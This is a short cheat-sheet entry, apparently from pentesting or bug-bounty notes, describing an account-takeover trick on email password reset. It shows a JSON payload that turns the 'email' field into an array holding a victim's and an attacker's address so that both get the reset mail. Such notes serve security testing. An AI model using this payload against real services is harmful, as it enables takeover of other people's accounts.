Password reset via email
```shell
If the request to reset the password via email sends data like this
{
	"email":"victim@mail.com"
}

You can try making a list of emails as payload
{
	"email":[
	"victim@mail.com",
	"attacker@mail.com"
	]
}

This way both emails can recieve the password reset mail.
```

